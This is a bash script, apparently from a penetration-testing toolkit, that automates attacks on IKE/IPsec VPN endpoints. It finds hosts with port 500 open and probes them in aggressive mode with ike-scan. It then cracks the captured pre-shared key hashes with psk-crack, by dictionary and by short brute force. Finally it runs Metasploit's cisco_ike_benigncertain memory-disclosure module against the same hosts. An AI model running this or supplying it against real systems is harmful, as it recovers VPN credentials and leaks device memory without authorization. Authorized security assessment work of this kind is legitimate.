#!/bin/bash
#IKE-SCANS
#
#sometimes nmap reads open ports as filtered and vice versa... so sometimes you will get filtered ports.
ikeAggressiveCheck(){

	cat udp-hosts.txt | grep "isakmp" | grep "500/open" | cut -d " " -f 2 > ike-hosts.txt
	if [ -s ike-hosts.txt ]
	then 
		echo "Running IKE-SCANS..."
		readarray ikearray < ike-hosts.txt
		for i in ${ikearray[@]}
			do
			echo "------------------------------------------------------------------------------"
			echo "Version Scan on Ike"
			echo
			echo "ike-scan -A -M -n bob on $i..."
			ike-scan -A -M -n bob $i | tee aggressive$i.txt
			echo
			cat aggressive$i.txt | grep Aggressive | ipextract > aggressivef$i.txt
			rm aggressive$i.txt
			if [ -s aggressivef$i.txt ]  
				then
				echo "Aggressive Response Found..."
				echo
				echo "Attempting a dictionary crack..."
				echo "ike-scan $i -A -M --id=trace -Ppsk$i.txt"
				ike-scan $i -A -M --id=trace -Ppsk$i.txt
				echo "psk-crack -d /usr/share/ike-scan/psk-crack-dictionary psk$i.txt"
				psk-crack -d /usr/share/ike-scan/psk-crack-dictionary psk$i.txt
				echo 
				echo "Attempting a very small brute force crack..." 
				echo "psk-crack -b 5 -c abcdefghijklmnopqrstuvwxyz0123456789!@# psk$i.txt"
				psk-crack -b 5 -c abcdefghijklmnopqrstuvwxyz0123456789!@# psk$i.txt
				
				rm psk$i.txt 
			echo
			echo "------------------------------------------------------------------------------"	
			echo
			echo
			echo

			fi
			rm aggressivef$i.txt
			
		echo
		done
	fi
	echo
	return 0;
}
echo

ikeAggressiveCheck | tee Ike-Results.log

metasploitSMB(){ 

	if [ -s ike-hosts.txt ]
	then 
	#Run the SMB_Version module 
	touch smbMetasploit.rc
	#
	echo "spool ike-benigncertain.log">>smbMetasploit.rc
	echo "use auxiliary/scanner/ike/cisco_ike_benigncertain">>smbMetasploit.rc 
	echo "set rhosts file:ike-hosts.txt">>smbMetasploit.rc	
	echo "show info">>smbMetasploit.rc
	echo "run">>smbMetasploit.rc 
	echo "spool off">>smbMetasploit.rc 
	echo
	echo "exit">>smbMetasploit.rc 
	
	msfconsole -r smbMetasploit.rc
	#use auxiliary/scanner/vnc/vnc_none_auth
	fi
return 0
}
metasploitSMB
rm smbMetasploit.rc

